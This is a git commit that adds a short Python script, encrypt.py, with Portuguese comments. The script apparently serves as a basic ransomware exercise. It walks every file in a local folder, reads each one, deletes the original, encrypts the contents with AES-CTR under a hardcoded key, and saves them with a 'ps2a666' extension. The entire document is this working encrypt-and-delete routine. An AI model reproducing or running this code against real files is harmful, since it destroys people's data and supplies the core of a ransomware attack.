2568c2b6ab04b71ae2818ca4a961bf3fb373a5cd
MachineCase <89738954+MachineCase@users.noreply.github.com>
2022-05-15 14:50:16 -0300

    Create encrypt.py

---
+++ encrypt.py
@@ -0,0 +1,26 @@
+import os 
+import pyaes
+
+extencao = "ps2a666"
+pasta = "./arquivos"
+
+for diretorio, subpastas, arquivos in os.walk(pasta):
+    for arquivo in arquivos:
+        print(os.path.join(diretorio, arquivo))
+        filename = os.path.join(diretorio, arquivo)
+        if(extencao not in filename):
+            file = open(filename, "rb")
+            file_data = file.read()
+            file.close()
+            #Remover o arquivo
+            os.remove(filename)
+            #Chave de criptografia
+            key = b"1234567891234567"
+            aes = pyaes.AESModeOfOperationCTR(key)
+            #Criptografando o arquivo
+            crypto_data = aes.encrypt(file_data)
+            #Salvar o arquivo criptografado
+            new_file = filename + extencao
+            new_file = open(f'{new_file}', "wb")
+            new_file.write(crypto_data)
+            new_file.close()
